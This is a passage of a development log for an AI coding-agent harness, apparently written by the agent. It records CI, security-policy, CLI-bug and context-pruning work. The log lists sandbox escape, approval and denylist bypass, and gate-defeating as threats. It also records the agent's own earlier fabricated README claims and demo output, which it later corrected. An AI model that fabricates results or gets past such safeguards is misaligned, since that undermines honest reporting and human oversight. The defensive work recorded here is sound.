   be verified — report it unverified, never fake a pass.
3. **Two guardrails promoted from this session's own audit findings**, since
   both were real mistakes that nearly shipped:
   - **Coherence check before writing code** — read what `PROJECT_SPEC.md` and
     the ADRs actually say about the row's area, and *stop and report* if the
     row contradicts an Accepted decision. Cites the live example: the queued
     model-catalog row contradicted ADR-015, which had already rejected static
     per-model tables ("static rots").
   - **Blast-radius check before widening a shared type** — a union
     re-exported as public API (`SandboxBackend` via `@clutchcode/agent-api`)
     or guarded by an exhaustive `never` check is a public-surface change, and
     usually a hint the design wants a new optional *field*, not a new variant.
4. **The quality bar restated inline** rather than assumed — no stubs;
   reproduce before fixing; prove the test discriminates via stash-revert;
   fix the class not the instance; real over mocked; flag what this
   environment can't verify; report what was verified and *how*.
5. **Row-selection hardened**: take the `DO FIRST` row (position is the
   priority signal), and **skip** anything marked `BLOCKED` / `watch item` /
   gated on a human decision — implementing one of those is a defect, not
   initiative. Re-read the table between units, since an earlier unit in the
   same run may have reordered it or moved the tag.
6. **`CLAUDE.md` updates stay rare, deliberately.** The request was to update
   it each cycle; that would make a timeless-conventions file churn with
   per-unit status and dilute it. `HANDOFF.md` is the per-unit checkpoint;
   `CLAUDE.md` is touched only when a unit surfaces a genuinely durable
   lesson. Stated explicitly in the loop so the distinction is not left to
   taste.

Also: `"start"` added as a recognized trigger variant; the relay step now
requires **verifying the reported commits actually exist** before passing a
subagent's report to the user, rather than relaying it on trust.

Every cross-reference in the new playbook was verified to resolve against the
repo (the `DO FIRST` tag, the table preamble, the blocked/watch rows, ADR-015's
rejection text, the `agent-api` re-export, the exhaustive `never` check, and
that all three gate commands run clean). Docs/skills only — no code: 687/687
passing, clean `tsc -b`, clean `eslint .`.

---

### Open-source packaging: CI, security policy, quickstart, publish metadata — and the doc split

The gap between "good codebase" and "a tool someone else can actually use"
was the whole finding of the direction review that prompted this. Four items,
plus a structural fix to the continuation docs.

1. **CI now exists** (`.github/workflows/ci.yml`). There were **no workflows
   at all** — the build/test/lint gate this project is philosophically built
   on was not enforced on the repository itself, so a contributor PR could
   merge red. That is the sharpest irony the codebase had. Runs the three
   gates separately (so a failure names which one broke) on Node 20 and 22,
   on push to `main`, on every PR, and on demand.
   **The load-bearing detail:** the workflow installs `bubblewrap`,
   `libsecret-tools`, `gnome-keyring` and `dbus-x11` *before* the suite, and
   then verifies each binary is on PATH. This is not optional hardening —
   without them roughly 9 tests fail outright, because this project's testing
   philosophy is "real over mocked wherever real is possible" and those suites
   exercise real OS confinement and a real Secret Service. Learned the hard
   way: this session's own container arrived without them and the baseline
   looked broken until they were installed.
2. **`SECURITY.md`** — absent, for a tool that executes model-generated shell
   commands and stores API keys. Written around the actual threat model
   (*the language model is untrusted; the harness is what stands between it
   and your machine*), with an explicit in-scope list tied to spec sections —
   worktree/workspace escape, sandbox escape, approval-engine bypass,
   denylist bypass, redaction leaks, credential storage, **and defeating the
   verification gate** — and an equally explicit out-of-scope list that names
   the known-unverified surfaces (macOS Seatbelt never run on real macOS,
   Windows doc-only, Landlock not implemented, Tier 0 fallback intentional)
   rather than leaving them to be discovered as surprises. Private reporting
   via GitHub advisories, not a personal email address.
3. **README quickstart.** The README opened with 500+ lines of status log and
   had no Install, Quickstart, or Usage section — a visitor could not work out
   how to run this. Added, above the log: what makes it different (the
   deterministic gate + cheat detection, stated as the wedge), a real
   quickstart written against the **actual CLI surface** (`--help` output was
   read for `init`/`run`/`approve`/`doctor`/`providers` rather than inventing
   flags), the review-before-merge loop, `--provider fake` for trying it with
   no model at all, and an honest-limitations section. The Status section is
   now labelled as an engineering log rather than documentation.
4. **Publish metadata across all 11 manifests** — `files`, `publishConfig:
   {access: "public"}` (scoped packages default to `restricted`; an unset
   access field is the classic 402/403-on-publish trap), `engines`,
   `repository` with per-package `directory`, `bugs`, `homepage`, `license`.
   Deliberately **not** the actual publish: `@clutchcode/cli` depends on
   `@clutchcode/agent-api` and `agent-rpc` via `workspace:*`, which transitively
   requires publishing all ten workspace packages as one coordinated release.
   That is a real unit of work with a release process attached, and half-doing
   it would be worse than not starting — queued as its own row instead.

**The doc split.** Merging `CLAUDE.md` and `HANDOFF.md` was proposed and
rejected on measurement: `CLAUDE.md` is injected into **every** session's
context automatically, and `HANDOFF.md` had reached 1,494 lines of which
1,257 (84%) was historical "what's done" entries while the actually-actionable
"What's left" was 30 lines (2%). Merging would have auto-loaded ~1,500 lines,
overwhelmingly history, into every session.

The real problem underneath the proposal was correct though — `HANDOFF.md` had
become unreadable. Fixed by archiving the history to **`docs/PROJECT_LOG.md`**
(this file), leaving `HANDOFF.md` at **253 lines**: snapshot header, "What's
left", the gotchas, and how to resume. `CLAUDE.md` gained a "The three
continuation documents" table making the three lifetimes explicit, and names
the failure mode to avoid: per-unit status creeping into `CLAUDE.md`, or
history re-accumulating in `HANDOFF.md`.

**And a PR step.** The work loop now ends at an open pull request: check
whether one exists for the branch (pushing already updates it), open one
against `main` if not, never a second PR for a branch that has one, never
reuse a merged PR. Added to `CLAUDE.md`'s loop as step 9, to "When you finish
a unit of work", and to both skill files' prompts.

No behavior change — CI config, docs, manifest metadata and skills only.
687/687 passing, clean `tsc -b`, clean `eslint .`.

### Test the guard, not just the fix: pinning the symlink-cycle hop limit

Small unit, self-inflicted. Reviewing the earlier dangling-symlink fix for an
external write-up, I noticed `resolveRealAsFarAsPossible` had gained a 40-hop
symlink-cycle guard (mirroring Linux's `MAXSYMLINKS`) and **no test covered
it**. Every actual bug fix in that commit had a test proven to fail against the
pre-fix code; the error path added alongside them had nothing. That is exactly
the shape of thing this project's conventions exist to catch, and it got in
anyway.

Two tests added to `workspace-path.test.ts`: a two-node cycle
(`loop-a -> loop-b -> loop-a`) and a self-referential symlink, both asserting
the resolver throws rather than spinning.

**Verified by removing the guard, and the result was worse than assumed.** The
expectation was "the test fails without it." What actually happens: the run
**hangs and has to be killed** (`timeout` returns 143). The component walk is
fully synchronous, so a cycle blocks the event loop and vitest's own per-test
timeout never gets a chance to fire — one bad path takes down the whole worker,
not one test. Guard restored, both tests pass.

Worth recording as a general lesson: *"prove the test fails against the
pre-fix code"* has a failure mode of its own. For a guard against
non-termination there is no failing assertion to observe, only a hang — so the
discrimination check needs a timeout and an exit-code assertion, not a test
result. Absence of a red test is not evidence the test is worthless.

689 tests (up from 687), clean `tsc -b`, clean `eslint .`.

### Landlock (§12.6) — attempted, and **stopped**: this kernel has no Landlock at all

The `DO FIRST` row. The plan queued for it was specific: pin
`@deepseek-ai/node-addon-landlock-run`, add a `landlock?: LandlockDetection`
field to `SandboxCapability` (**not** a `SandboxBackend` variant — that union
is closed, publicly re-exported, and guarded by an exhaustive `never` check),
emit the launcher into the argv `buildBwrapSpawn` already produces, write our
own status-gated failure classification, and prove all of it with **real tests
on this Linux host** in the style of the existing bwrap/seccomp suites.

The last clause is where it stopped. **This host's kernel cannot enforce
Landlock, so not one confined process can be observed here** — and a Landlock
ruleset's failure mode is precisely the one this project already decided not to
risk blind (`seccomp-linux.ts`'s header: *"Landlock's failure mode (a
slightly-wrong rule silently granting more access than intended) is a worse
category of mistake to risk without that same empirical backstop"*).

**What was verified, and how — the dependency is fine; the kernel is not.**

The package half of the plan checks out completely. Installed clean
(`npm install @deepseek-ai/node-addon-landlock-run@0.1.1` in a throwaway dir,
2 packages, 0 vulnerabilities), the `linux-x64` optional dependency resolved,
and the launcher is a real, runnable, statically-linked ELF:

```
landlock-run: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

It executes and its fail-closed contract is observable — a usage error exits
`125` with a launcher-owned fatal line, exactly as documented:

```
$ landlock-run                       → landlock-run: usage error: missing `-- <argv>...` command   (exit 125)
```

But every attempt to actually *confine* anything fails on the kernel:

```
$ landlock-run --probe               → landlock-run: landlock is not enforced by this kernel (ABI unsupported or disabled)   (exit 125)
$ landlock-run --ro /usr --rw /tmp -- /bin/echo hello
                                     → landlock-run: landlock is not enforced by this kernel (ABI unsupported or disabled)   (exit 125)
$ node -e "probe()"                  → 'unusable'
```

Three independent confirmations that this is the kernel, not the package —
reproduced rather than inferred, per `CLAUDE.md`'s "reproduce before fixing":

1. **The active LSM list has no Landlock.** `securityfs` isn't mounted by
   default here; mounting it (`mount -t securityfs securityfs
   /sys/kernel/security`) gives `/sys/kernel/security/lsm` =
   `capability,selinux`.
2. **The syscall itself is absent.** Calling `landlock_create_ruleset(NULL, 0,
   LANDLOCK_CREATE_RULESET_VERSION)` (syscall 444 on x86_64) directly via
   `ctypes` returns `-1` with `errno 38 — ENOSYS, "Function not implemented"`.
   A kernel that had Landlock compiled in but disabled would return the ABI
   version or `EOPNOTSUPP`, not `ENOSYS`.
3. **The kernel's own config says so.** `zcat /proc/config.gz | grep -i
   landlock` →
   ```
   # CONFIG_SECURITY_LANDLOCK is not set
   ```
   Not disabled at boot, not gated behind an `lsm=` parameter — **not compiled
   in**. `CONFIG_LSM` doesn't list it either. This is a Firecracker microVM
   kernel (`6.18.44-fc-v22`, `rdinit=/process_api --firecracker-init`); it is
   not reconfigurable from inside the guest, so there is no `apt-get install`
   or sysctl that makes this testable.

**Why this is a stop and not a "write it and flag it".** The repo does have a
convention for un-exercisable platform code — split out a pure
command/profile builder, assert it directly, flag it loudly (that is how
Seatbelt and the macOS keychain shipped). It was considered and rejected here
for three reasons specific to Landlock:

- **The un-exercisable part is the security property itself, not a
  platform-formatting detail.** `buildSeatbeltProfile` is a pure string
  builder whose correctness is legible from the profile text. A Landlock rung's
  correctness is *which roots got granted `--ro` vs `--rw`* — and an
  over-permissive grant looks exactly like a correct one until a real kernel
  denies a real read. Nothing on this host can ever produce that denial.
- **The one test §2a makes binding is the one that would pass for the wrong
  reason.** `LICENSE_AND_REUSE_ANALYSIS.md §2a` condition 3 requires "a real
  test on this Linux host asserting that an unusable/absent launcher yields no
  Landlock rung rather than an unconfined run." That test is writable here —
  but on this host *every* launcher probes `unusable`, so it would pass
  identically against an implementation that never had a working rung at all.
  It would discriminate nothing. Per `CLAUDE.md`'s stash-revert discipline,
  that is not a test, it is a decoration.
- **The row's own plan assumed a capability this host lacks.** Step (4) says
  "real tests on this Linux host … a file outside the allow-list genuinely
  unreadable." That is unsatisfiable here, and the honest response to an
  unsatisfiable acceptance criterion is to say so, not to quietly weaken it.

**What is now known that wasn't before** (the point of writing this down): the
blocker on this row has *changed identity*. It is no longer "no vetted helper
exists" — that objection is genuinely retired, the helper exists, installs,
and is fail-closed by construction. It is now purely **"no Landlock-capable
kernel is reachable from this environment."** That is a host problem with a
concrete, checkable trigger, recorded on the row in `HANDOFF.md`: any host
where `zcat /proc/config.gz | grep -i landlock` shows
`CONFIG_SECURITY_LANDLOCK=y` **and** `landlock-run --probe` exits `0` unblocks
the row immediately, and the implementation plan already audited into that row
(the `SandboxCapability.landlock` field, *not* a `SandboxBackend` variant)
stands as written.

**Nothing was committed to `packages/sandbox`, and the dependency was not
added** — a pinned dependency whose only consumer would be untested
security-critical code is worse than no dependency. `pnpm-lock.yaml` is
untouched; the probing was done entirely in a scratch directory outside the
repo.

No code change. 689/689 still passing, clean `tsc -b`, clean `eslint .`.

### `agent workflow` (§18.2) — and a shipped CLI option-shadowing bug found while building it

The `DO FIRST` row after Landlock turned out to be host-blocked. §18.2 lists
`agent workflow` — "list/select/validate workflows (§8)" — as Phase 2, and
both of §8.1's authoring layers already existed; what was missing was any way
to *inspect* either one without starting a run. Checked against
`PROJECT_SPEC.md` §8.1/§8.2/§18.2 and ADR-003 before writing code: no
contradiction — ADR-003 already commits to "workflows typed-DSL + declarative
schema", which is exactly what this command surfaces.

**Built.** Two subcommands in `apps/cli`, backed by pure functions in
`commands.ts` (`cmdWorkflowList`, `cmdWorkflowValidate`) exactly like every
other command:

- `workflow list [files...]` — the three built-ins plus any declaration files
  named on the command line, each with the `WorkflowPlan` it actually resolves
  to. Showing the plan (not just a label) is the point: a `plan` stage without
  `params.mode: "always"` resolves to `auto`, and a listing that hid that would
  misrepresent what the workflow does. A file that fails to load is listed
  *with its error* rather than aborting the listing — "what can I run, and
  what's broken?" wants both halves — and the exit code is `4` when any
  explicitly-named file failed, so a script needn't parse prose.
- `workflow validate <path>` — the same schema + semantic validation
  `agent run --workflow-file` performs, with no run started and nothing
  written, printing the resolved plan on success. A built-in id passed where a
  path belongs is named as the actual mistake instead of surfacing an ENOENT
  on a file called `quickfix`.

**Deliberately not built: a discovery convention for custom workflows.** The
row's wording ("built-ins + any locally-referenced custom ones") has no
referent today — there is no registry of installed declarative workflows, they
are referenced per-run by path. Inventing one (a config key naming a workflow
directory) is a **config-schema** decision, and ADR-003 rates config-schema
reversal as "hard once users have config files". So `list` takes the files you
point it at and persists nothing. Recorded rather than silently skipped.

**No package-boundary change was needed.** Everything the CLI needs
(`BUILTIN_WORKFLOWS`, `isBuiltinWorkflowId`, `loadWorkflowDeclaration`,
`resolveWorkflowPlan`, `resolveBuiltinWorkflowPlan`, `WorkflowPlan`) was
already re-exported through `@clutchcode/agent-api`, so §20's "apps depend
only on agent-api" holds unchanged and no new dependency was added.

---

**Then the actual find: a real, shipped CLI bug, reproduced against the
binary.** Writing the argv test for `workflow list --json` showed it printing
human-readable output. That was not a bug in the new command.

**Mechanism**, isolated with a four-variant minimal repro rather than guessed:
in commander v15, when a **parent command and its subcommand both declare the
same long option**, the flag is parsed onto the **parent**, and the
subcommand's own `opts()` keeps its declared default forever. The parent's
having an action handler is irrelevant; the duplicate *option registration* is
what does it. Confirmed with a parent/child pair carrying deliberately
different defaults: `group list --json --repo X` gave the child
`{json:false, repo:"CHILD_DEFAULT"}` while `optsWithGlobals()` and the parent
both showed `{json:true, repo:"X"}`.

Every `memory` and `providers` subcommand re-registered `baseOptions`, so the
bug was already shipped in six places. Reproduced end to end against the built
binary:

```
$ cd /home/user/ClutchCode
$ clutchcode memory correct build "npm run build" --repo /tmp/mrepo
build: corrected to "npm run build"          ← reports success
$ clutchcode memory --repo /tmp/mrepo --json
null                                          ← the named repo got nothing
$ clutchcode memory --json
{"facts":{"build":{"value":"npm run build",…}}}   ← it landed in the cwd repo
```

A **write to the wrong repo, silently, with a success message.** `memory
forget` deletes from the wrong repo the same way. The `--json` half breaks
§18.4's "`--json` always prints machine-readable output to stdout" contract
for every `memory`/`providers` subcommand — `memory list --json` printed
prose.

**Fixed as a class, not per call site**, which is the standing rule here (the
`assertSafeRunId` lesson: one shared validator, not a patch at one call site).
A group's shared options are now declared **once, on the group parent**, and
its subcommands read the merged view through a single `globalOpts(cmd)` helper
over commander's own `optsWithGlobals()`. Verified first that parent-only
declaration parses correctly in every position — `group list --json`,
`group --json list`, `group list a b --json` (after variadic args), and the
default case — before relying on it.

To make the invariant *enforceable* rather than a comment, the command tree
moved out of the bin entry into **`apps/cli/src/program.ts`** exporting
`buildProgram()`; `cli.ts` is now nine lines that build and parse. That split
exists so a test can inspect the tree as a data structure without importing a
module that parses `process.argv` and calls `process.exit` at import time —
the alternative (a main-module guard) would have risked breaking the installed
binary, whose `process.argv[1]` is an npm symlink rather than the real file.

**What was verified, and how.** 707/707 passing (up from 689 — **18 new
tests**), 77 test files, clean `tsc -b`, clean `eslint .`.

- 9 tests in `commands.test.ts` over the real workflow layer and real files on
  disk: built-in plans match what `AgentLoop` is actually driven by
  (`default` → auto/false, `quickfix` → never/false, `review-only` →
  never/true); a custom file is folded in with `planMode: "always"` and stages
  rendered `plan(always) → implement → verify`; a broken file is listed with
  its error while the built-ins still list, exit `4`; schema violations and
  each semantic rule are reported specifically; a built-in id given as a path
  is named as such; a missing file reports cleanly.
- **The load-bearing one:** `validate` and a real `agent run --workflow-file`
  are asserted to agree in both directions on the same files — same verdict,
  same §18.4 exit code, same message — against a real git repo with
  `FakeProvider` stubbing only the model. Without this, `validate` would be a
  second copy of the acceptance rules free to drift from the ones that
  actually gate a run.
- 6 tests in `cli.test.ts` spawning the **real compiled binary**, because
  argv parsing is the whole subject: `workflow list`, bare `workflow`,
  variadic `workflow list a b --json`, `validate` exiting `4`/`0`, plus the
  two regression tests for the shadowing bug (`memory correct --repo <other>`
  writes to the repo named and *not* to the cwd repo; `memory list --json`
  emits parseable JSON). `HOME` is redirected to a throwaway dir per run so
  the memory store under `~/.config/clutchcode/memory` is never the
  developer's.
- 3 tests in the new `cli-structure.test.ts` walking `buildProgram()`: no
  subcommand re-declares an ancestor's option; the walker is proven
  non-vacuous by re-adding a shadow and asserting it is caught; and each group
  parent still owns the shared options its children now inherit.

**Discrimination check (`CLAUDE.md`'s stash-revert discipline).** The fix was
flipped off by restoring the pre-fix registration shape for `memory list` and
`memory correct` and rebuilding. **Four tests went red** — the structural
invariant, its own non-vacuity guard, `memory correct --repo`, and `memory
list --json` — and all four went green again on restore. The workflow tests
were unaffected either way, correctly: they test a different thing.

**Cleanup worth noting:** reproducing the bug wrote a fact into this repo's
own real memory store. It was removed (`memory forget build`) once the fix was
confirmed, not left behind.

### Tool-result pruning as a distinct compaction stage (§4.5) — and a test helper that was lying

Next unblocked row after `agent workflow`. Checked the rows above it first and
skipped each for a stated reason rather than by preference: the **npm release**
row needs human decisions (npm org/scope ownership, lockstep-vs-independent
versioning); **provider stop/finish-reason conformance** says of itself "left
queued rather than decided unilaterally" — widening `FinishReason` and deciding
what `AgentLoop` does with a paused turn is the gated part, and building
conformance tests around it while pinning the known-wrong `pause_turn → "stop"`
mapping would bless a defect rather than surface it; **ACP** would add a new
runtime dependency; the **generated model catalog** is `BLOCKED` on an ADR
decision. `HANDOFF.md`'s `DO FIRST` tag was moved off the provider row to this
one accordingly — it had been placed there earlier in this same run before that
self-declared gate was weighed properly.

**Coherence check before writing code.** §4.5 names "summarization checkpoints
(compact tool history into a running summary at thresholds)" as a mandatory
technique. `context-compaction.ts` already answers the pressure by dropping
whole turns and says openly that model-driven summarization is a Phase-7 memory
feature it does not build. Pruning tool results is neither of those — it is a
third, cheaper stage in front of compaction — so it extends §4.5 rather than
contradicting it, and no ADR speaks to it. `docs/PRIOR_ART.md` already carried
the row recording exactly what was studied (that a model-free tool-result
pruner belongs in its own stage, separate from the compactor) and what must not
be copied (their pruner, heuristics, and seam structure).

**Built:** `packages/runtime/src/tool-result-pruning.ts` —
`pruneSupersededToolResults(messages, budgetTokens)`, running as its own stage
immediately before `compactHistory` in `AgentLoop.actLoop`.

The rule is deliberately narrow and entirely model-free: a tool result is
superseded when the **same tool** was later called with **byte-identical
arguments**, so a newer answer to the exact same question is already in
context. That needs correlating each `tool` message back through its
`toolCallId` to the assistant message that made the call, since
`NormalizedMessage` carries the tool name and args on one and only the id on
the other. Not pruned: two `read_file` calls on the same path with different
line ranges (different questions, both live), the same arguments to a different
tool, any result with no later identical twin, and any result whose orphaned
call is no longer in the transcript (what a resumed, already-compacted history
looks like).

Three properties make it strictly safer than compaction, and each has a test:

- **It never removes anything.** Only the `content` of a superseded result is
  replaced, with a placeholder that says the call was re-run and the newer
  result is still present. Every message, role, `toolCallId`, `toolCalls`
  array, and turn boundary survives — so, unlike compaction, it can never
  strand a tool result whose call was dropped.
- **It is budget-gated and inert until needed.** Under budget it returns the
  *same array object*, asserted by identity, not equality: a run that never
  approaches the ceiling is byte-identical to one built without this module.
- **It stops as soon as the budget is met.** Oldest-first, one at a time — the
  least intervention that clears the pressure, not a sweep of everything
  prunable.

The interesting case, called out in the module header rather than glossed: an
identical `shell` command run before and after an edit produces *different*
output, and pruning the earlier one drops the "before" state. That is the
intended behavior — the failing pre-edit `npm test` is the canonical stale tool
result §4.5's lever is aimed at — which is why the placeholder states plainly
that the call was re-run instead of leaving an unexplained hole.

**Blast radius, checked before writing (loop step 4).** The new
`context.pruned` event widens `RuntimeEvent`, which **is** re-exported as
public API from `@clutchcode/agent-api` and **is** consumed by an exhaustive
`const exhaustive: never = event` switch in `apps/vscode/src/presentation.ts`.
Judged additive rather than a break, and the reasoning is recorded so a
reviewer can disagree: an event *stream* union is a designed-for extension
point (the VS Code switch's fallback already prints "? unknown event"),
`agent-rpc` forwards events as `unknown` so no wire contract moves, and
`context.compacted` itself was added the same way. It was **not** folded into
`context.compacted` as an extra field, because pruning drops no messages and
reporting it as a compaction with `droppedCount: 0` would misdescribe what
happened. `presentation.ts` is updated in the same commit.

---

**A real bug found in a test helper, and it was quietly undermining assertions.**
`FakeProvider.requestLog` is documented as "every request this provider
received, in order — for assertions in tests." It pushed the caller's
`NormalizedRequest` **by reference**, and `AgentLoop` appends to that same
`messages` array every turn — so every logged entry silently mutated into the
*final* history. `requestLog[0].messages` never described request 0.

Found by instrumenting the failing pruning integration test: all three logged
requests printed identical 3-tool-result histories, which is impossible for the
first one. Fixed by snapshotting the array per call. The message objects stay
shared, which is correct and stated in the comment: the runtime replaces
messages (`replaceMessages`, and pruning's `{...message, content}`) rather than
mutating them in place, so a shared object is never rewritten under a logged
entry. No existing test changed behavior — this widened what `requestLog` can
honestly be used for rather than narrowing it.

**What was verified, and how.** 720/720 passing (up from 707 — **13 new
tests**), 78 test files, clean `tsc -b`, clean `eslint .`.

- 10 unit tests in `tool-result-pruning.test.ts`: the under-budget no-op
  asserted by array *identity*; a stale `npm test` result blanked while the
  fresh one stays byte-intact; message count, roles, `toolCallId`s and
  `toolCalls` all unchanged and the input array unmutated; same tool with
  different args not pruned; same args to a different tool not pruned;
  oldest-first with exactly one prune when one suffices (budget derived from
  the real estimate, so the test states the rule rather than encoding today's
  arithmetic); two prunes when one does not, with the reported
  `reclaimedTokens` checked against the actual before/after difference; a short
  superseded result deliberately left alone because the placeholder would cost
  more than it saves; an orphaned result ignored; empty history.
- 1 integration test in `agent-loop.test.ts` driving the **real loop against a
  real shell** — three genuine `shell` executions of the same command, each
  ~4KB of real output, with a capability tuned so the third turn is the first
  that must shed something. Asserts `context.pruned` fires with a real
  `prunedCount`/`reclaimedTokens`, that the placeholder was in the request the
  model was actually sent, that exactly one full-size copy survived, and that
  the persisted transcript still holds all three tool messages.
- 1 regression test in `fake-provider.test.ts` for the snapshot bug, and 1 in
  `presentation.test.ts` for the new event's rendering.

**Discrimination checks (both, and both real).** Flipping the pruning stage off
in `AgentLoop` (replacing the call with an inert result) turned the integration
test red, and it went green again on restore. Reverting the one-line
`requestLog` fix turned the new snapshot test red, and green again on restore.
The 10 pure-function unit tests were not stash-reverted, and that is stated
rather than skipped quietly: they exercise a brand-new module through direct
assertions on its return value, with no pre-fix code for them to discriminate
against — `CLAUDE.md`'s carve-out for a fix "whose correctness is unambiguous
from its own assertions."

### README rewritten as a project front page — and two false claims caught in my own draft

The README was 755 lines that opened with a 500-line engineering log and had no
Install section until well past the fold. Rewritten as an actual front page:
centred header with live shields.io badges, a real terminal transcript, "why
this exists", a **Mermaid architecture diagram** generated from the true package
dependency graph (GitHub renders Mermaid natively, so no image assets and no
drift), a **Mermaid sequence diagram** of the run lifecycle, a feature table,
collapsible quickstart steps, a roadmap gantt, and contributing rules. 755 → 370
lines, and the history it used to carry already lives in this file.

Two clearly-marked comment slots were left for a logo and a demo GIF, each with
the exact command to produce the asset (`vhs`, or `asciinema` + `agg`) rather
than a vague TODO. Those are the only things here that cannot be generated
without a human.

**The part worth recording: two claims in the first draft were false, and both
were caught by checking rather than by review.**

1. **"🔌 MCP client — speaks the open Model Context Protocol"** was listed as a
   shipped feature. `grep -rl "modelcontextprotocol\|McpClient\|mcp"
   packages/*/src` returns **nothing**. MCP is specified (§15) and named in the
   reuse analysis as the one genuine protocol REUSE, but it is not implemented.
   Row deleted, and the roadmap gantt corrected to move MCP from *Shipped* to
   *Next* where it belongs.
2. **The terminal demo was invented.** The draft showed a spinner UI
   (`⠋ planning … ⠹ verifying …`) that does not exist. Running the real binary
   prints a plain status block instead. Replaced with genuine output — which is
   strictly better marketing anyway, because the real thing prints
   `verification: green; cheat flags: 0`, i.e. the actual differentiator, rather
   than decoration.

A README is marketing, and marketing is exactly where a project whose whole
premise is "don't trust what the model claims, trust what the gate proves" can
least afford an unbacked claim. The performance section was written the same
way: no invented benchmarks, because there are none — the eval scoreboard is a
roadmap row. In its place is a table of what *is* verified and **how** (the
sandbox test that writes outside the workspace and asserts the read fails; the
per-syscall `EPERM` check with an unfiltered control run; the redaction canary;
the recorded run where a model deletes an assertion and completion is blocked
anyway). That table is more persuasive than a benchmark number would have been.

Also found while capturing the real CLI output: on a repo with no `AGENTS.md`,
`clutchcode run` leaks `fatal: path 'AGENTS.md' does not exist in '<sha>'` to
the console before its status block — a raw git error for a benign, expected
condition, and the literal first thing a new user sees. Same class as the
documented `execFileSync` stderr-leak gotcha. Queued as its own row rather than
fixed here, to keep this unit to one concern.

Docs only. 720/720 passing, clean `tsc -b`, clean `eslint .`.

### Recovering what the README rewrite actually dropped, and re-homing what it created

Follow-up to the README front-page rewrite, prompted by "if any of the info in
the README is useful, add it to the relevant docs." Two directions: what the cut
lost, and what the rewrite newly created that belongs elsewhere.

**A correction to the previous entry.** That entry claimed the ~500 cut lines of
`## Status` "already live in `docs/PROJECT_LOG.md`, so nothing was lost." That
was asserted rather than checked. Checking it: of 103 distinctive sentences in
the old Status section, **99 appear nowhere** in either `PROJECT_LOG.md` or the
new README.

That number overstates the damage — it fingerprints *prose*, and the log's
entries describe the same work in different words. Probing for the substantive
facts instead shows they did survive: `credentials.age` (2 hits),
`AES-256-GCM` (1), `DPAPI` (1), `secret-tool` (4), `Seatbelt` (5), `Phase 1`
(6). So the information largely persisted and only the phrasing went.

**But one thing genuinely vanished, and it was the most-read line in the file:**
the current-phase framing. `PROJECT_SPEC.md §21` defines the phase *plan*;
nothing anywhere stated the project's *position* in it. `grep -l "Phase 1
shipped\|Phase 2 in progress" *.md docs/*.md` returned nothing at all after the
rewrite. Recovered into `HANDOFF.md`'s snapshot header, which is the file that
exists to answer "where does this stand right now" and is read at the start of
every session — a better home than the README ever was.

**Re-homing what the rewrite created.** The README's Mermaid architecture
diagram was built from the real package dependency graph, and
`PROJECT_SPEC.md` turned out to contain **zero diagrams** — §20 expresses
repository structure as an ASCII tree, which shows *layout* but cannot show
*who may depend on whom*. That dependency rule is the normative part of §20
("`apps/*` depend only on `agent-api`"), so the diagram was added there
alongside the tree, with the leaf packages (`git`, `providers`, `sandbox`)
called out and an explicit statement that an upward edge or an `apps/*` edge
bypassing `agent-api` is a violation *regardless of whether it compiles*.

§6's agent-loop section was considered for the run-lifecycle sequence diagram
and deliberately left alone — it already carries four code blocks, so the
diagram would have been decoration rather than clarification.

**The lesson worth keeping:** "this content already exists elsewhere" is a
claim about the repository, and claims about the repository get checked here
like any other. It happened to be *mostly* true, and the part that wasn't was
the single line most readers would look for first.

Docs only. 720/720 passing, clean `tsc -b`, clean `eslint .`.

### Marketing-README follow-up: proved the diagrams render, fixed a fabrication in my own draft, shipped a real demo GIF, and fixed the underlying stderr-leak bug

Directly prompted by "lots of texts no architecture, it has to be like a
marketing readme, it is so bad" — pointed at the same README rewritten two
entries ago. Rather than assume either "the user is wrong" or "the content is
wrong," checked both.

**The Mermaid content itself is not the problem — proved, not assumed.**
Installed `@mermaid-js/mermaid-cli`, extracted all three `mermaid` blocks from
the live README, and rendered every one to a real PNG: the architecture
flowchart, the run-lifecycle sequence diagram, and the roadmap gantt all
render cleanly, with correct subgraphs, colors, and arrows. So the complaint
is very likely a *viewing* issue, not a *content* one — the most probable
cause is that GitHub does not render Mermaid inside a PR's "Files changed"
diff view (plain text/diff only), only in the actual file/blob view on a
branch. Told the user how to check directly.

**But auditing the README for the complaint surfaced two real problems
anyway, both fixed for real rather than talked around:**

1. **The top of the page was, in fact, visually empty.** The "logo" area was
   only an HTML comment — literally nothing rendered there. Replaced with a
   real generated banner via `capsule-render` (a URL-parameterized SVG
   service, fetched by GitHub's own renderer at view time, not by this
   session — the same technique used across thousands of public READMEs) so
   there is now an actual colored, animated header instead of plain heading
   text. The custom-logo option is preserved as a comment for later.

2. **The demo transcript in the README was fabricated, and this review is
   what caught it.** It showed `--provider ollama --model qwen2.5-coder:14b`
   with `steps: 4/50 tokens: 18204/200000` — numbers that were never actually
   produced. The genuine output this session verified earlier (with
   `--provider fake`, the only path actually run) was `steps: 1/50 tokens:
   0/200000`. This is exactly the class of unbacked claim this project exists
   to catch, and it had shipped in a commit two entries ago. This time, rather
   than just correct the numbers, a **real recorded demo GIF** was shipped
   instead of a placeholder comment:
   - Installed `asciinema` (apt) and the real `agg` (compiled from
     `github.com/asciinema/agg` via cargo — the crates.io package named `agg`
     is an unrelated library, a genuine dead end worth noting for next time).
   - Recorded a real scripted session (`doctor`, then `run … --provider
     fake`) against the actual compiled CLI, converted to a GIF, and
     committed it to `docs/assets/demo.gif`.
   - Wrote `docs/assets/record-demo.sh` so this is regeneratable, not a
     one-off artifact — and **ran it end-to-end from a clean state** to prove
     it actually reproduces the same output, rather than committing a script
     that had only run once by hand.

**Recording the demo surfaced a real bug, and the honest fix was to fix the
bug rather than filter the recording.** The genuine output included a leaked
`fatal: path 'AGENTS.md' does not exist in '<sha>'` line — the exact issue
already queued as a `What's left` row from the previous README pass. Piping
that line out of the recording would have been editing around a known defect
instead of fixing it, so the defect was fixed instead:

`packages/git/src/git-exec.ts`'s `git()` wrapper left `stdio` on
`execFileSync`'s default, which carries a documented Node quirk — even though
the *default* `stdio` is `'pipe'`, stderr specifically is still forwarded live
to the parent process's stderr unless `stdio` is passed as an explicit array.
The same gotcha this project had already fixed once, for the keychain
wrappers. **Empirically verified both sides before touching shared code**
(this function backs every worktree/checkpoint/rollback operation, so
blindly `stdio: ["ignore","pipe","ignore"]`-ing it would have blinded
`GitError`'s message for every *other*, non-`allowFailure` caller too): a
scratch script confirmed the default leaks to the real console while
`stdio: ["ignore","pipe","pipe"]` does not — and that `err.stderr` is still
fully populated either way. Fixed with the latter.

Two new tests, one of which taught a real lesson about test isolation. The
